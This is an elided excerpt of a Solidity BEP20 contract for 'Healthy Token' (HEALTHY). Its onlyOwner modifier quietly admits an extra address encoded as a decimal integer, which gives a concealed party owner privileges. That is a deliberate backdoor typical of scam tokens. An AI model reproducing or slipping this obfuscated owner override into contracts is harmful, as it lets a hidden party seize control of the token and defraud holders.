...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        ...
        || msg.sender == address(1034982253141982061639277868293387430312856315695), "Ownable: caller is not the owner");
        _;
    }
...
contract Healthy is Context, IBEP20, Ownable {
    ...
    address payable private Maddress = payable(0xCCCC794F9F0C74e83a00F3Dbb1F2A2D4ef7FA514); //Mark Address
    ...
    string public _name = "Healthy Token"; 
    string public _symbol = "HEALTHY";
